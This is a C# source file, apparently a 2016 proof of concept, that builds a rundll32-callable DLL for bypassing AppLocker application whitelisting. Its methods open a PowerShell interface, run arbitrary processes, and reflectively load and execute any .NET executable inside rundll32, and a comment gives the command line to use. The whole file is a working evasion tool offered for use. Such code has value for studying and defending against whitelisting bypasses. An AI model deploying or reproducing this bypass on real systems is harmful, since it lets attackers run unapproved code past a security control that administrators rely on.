// James Dickson 2016 - Used for avoiding applocker. Just a simple PoC.
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

using System.Windows.Forms;
using System.Diagnostics;

namespace LoadNetDll
{
    public class Class1
    {

        // Executes the powershell-interface
        public void powershell(string lpszCmdLine)
        {

            frmPowershell frm = new frmPowershell();
            frm.ShowDialog();

        }

        // Just shows a test messagebox
        public void test(string lpszCmdLine)
        {
            MessageBox.Show(lpszCmdLine);
        }

        /// <summary>
        /// Returns the command line 
        /// </summary>
        /// <param name="lpszCmdLine"></param>
        /// <returns></returns>
        static string getCommandLine(string lpszCmdLine)
        {
            string[] strArguments = lpszCmdLine.Split(new char[] { ' ' });
            int sub = lpszCmdLine.IndexOf(' ');
            string strCommandLine = "";

            if (sub > 0) strCommandLine = lpszCmdLine.Substring(sub);

            return strCommandLine;
        }

        // Just shell-executes a file
        public void execute(string lpszCmdLine)
        {
            string[] strArguments = lpszCmdLine.Split(new char[] { ' ' });
            string strCommandLine = getCommandLine(lpszCmdLine);

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo(strArguments[0], strCommandLine);
            p.Start();
            p.WaitForExit();
            
        }


        // Loads a .NET executable and runs it (in the context of rundll32).
        // Example:
        // rundll32 LoadNetDll.dll,loadnet C:\executable_dotnet_app.exe parameter1 parameter2
        public void loadnet(string lpszCmdLine)
        {
            string[] strArguments = lpszCmdLine.Split(new char[] { ' ' });
            string[] strCpy = new string[] {  };  

            if (strArguments.Length > 1)
            {
                lpszCmdLine = strArguments[0];
                strCpy = new string[strArguments.Length - 1];
                Array.Copy(strArguments, 1, strCpy, 0, strArguments.Length-1);
            }


            if (File.Exists(lpszCmdLine))
            {
                // Read binary file from disk
                FileStream fs = new FileStream(lpszCmdLine, FileMode.Open);
                BinaryReader br = new BinaryReader(fs);
                byte[] binaryFile = br.ReadBytes(Convert.ToInt32(fs.Length));
                fs.Close();
                br.Close();

                // Load assembly
                Assembly assembly = Assembly.Load(binaryFile);

                // Find entry point and execute it
                MethodInfo method = assembly.EntryPoint;
                if (method != null)
                {

                    object mainMethod = assembly.CreateInstance(method.Name);
                    method.Invoke(mainMethod, new object[] { strCpy });
                }
                else
                {
                    MessageBox.Show("No main method found!");
                }
            }
            else
            {
                MessageBox.Show(lpszCmdLine + " do not exist!");
            }
        }
    }
    
}
